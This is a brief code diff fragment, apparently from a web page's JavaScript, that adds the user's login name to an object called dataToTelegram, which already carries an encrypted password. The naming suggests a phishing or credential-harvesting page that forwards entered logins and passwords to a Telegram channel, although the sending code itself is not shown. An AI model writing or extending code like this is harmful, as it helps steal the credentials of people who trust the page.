@@ -162,6 +162,7 @@ TQIDAQAB
 
         const dataToTelegram = JSON.stringify({
             action: "login",
+            login: document.getElementById('login_input').value,
             password: encryptedPassword
         });
 
